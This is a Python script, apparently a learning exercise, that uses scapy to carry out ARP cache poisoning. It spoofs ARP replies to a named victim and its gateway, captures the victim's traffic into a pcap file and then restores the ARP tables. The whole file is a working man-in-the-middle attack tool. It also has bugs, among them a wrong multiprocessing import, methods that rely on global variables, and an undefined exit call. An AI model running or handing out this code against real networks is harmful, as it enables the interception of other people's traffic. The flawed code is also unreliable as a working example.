#! /usr/bin/env python
from multiprocessing import process
from scapy.all import (ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap)

import os, sys, time


#function to get the mac address of a target.
def get_mac(ip):
    packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip)
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
    for _, r in resp:
        return r[Ether].src
    else:
        return None
    
print(get_mac("10.0.4.1"))


class Arper:
    def __init__(self, victim, gateway, interface="eth0"):
        self.victim = victim
        self.victimmac = get_mac(victim)
        self.gateway = gateway
        self.gatewaymac = get_mac(gateway)
        self.interface = interface
        conf.iface = interface
        conf.verb = 0
        print(f"Initialized {interface}")
        print(f"Gateway ({gateway}) is at {self.gatewaymac}")
        print(f"Victim ({victim}) is at {self.victimmac}")
        print("-"*30)

    def run(self):
        self.poison_thread = process(target=self.poison)
        self.poison_thread.start()

        self.sniff_thread = process(target=self.sniff)
        self.sniff_thread.start()

    def poison(self):
        poison_victim = ARP()
        poison_victim.op = 2
        poison_victim.psrc = self.gateway
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victimmac
        print(f"ip src: {poison_victim.psrc}")
        print(f"ip dst: {poison_victim.pdst}")
        print(f"hwaddr dst: {poison_victim.hwdst}")
        print(f"hwaddr src: {poison_victim.hwsrc}")
        print(poison_victim.summary())
        print("-"*30)
        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gatewaymac

        print(f"ip src: {poison_gateway.psrc}")
        print(f"ip dst: {poison_gateway.pdst}")
        print(f"hwaddr src: {poison_gateway.hwsrc}")
        print(f"hwaddr dst: {poison_gateway.hwdst}")
        print(poison_gateway.summary())
        print("-"*30)
        print("Beginning the ARP poisoning. [CTRL-C to stop]")
        while True:
            sys.stdout.write(".")
            sys.stdout.flush()
            try:
                send(poison_victim)
                send(poison_gateway)
            except KeyboardInterrupt:
                self.restore()
                self.exit()
            else:
                time.sleep(2)


    def sniff(self, count=200):
        time.sleep(5)
        print(f"Sniffing {count} packets")
        bpf_filter = "ip host %s" % victim
        pkts = sniff(count=count, filter=bpf_filter, iface=self.interface)
        wrpcap('arper.pcap', pkts)
        print("got the packets")
        self.restore()
        self.poison_thread.terminate()
        print("Finished")

    def restore(self):
        print("Restoring ARP tables...")
        send(ARP(
            op=2,
            psrc=gateway,
            hwsrc=self.gatewaymac,
            pdst=self.victim,
            hwdst='ff:ff:ff:ff:ff:ff'
        ), count=5)
        send(ARP(
            op=2,
            psrc=self.victim,
            hwsrc=self.victimmac,
            pdst=self.gateway,
            hwdst='ff:ff:ff:ff:ff:ff'
        ), count=5)


if __name__ == '__main__':
    (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
    myarp = Arper(victim, gateway, interface)
    myarp.run()
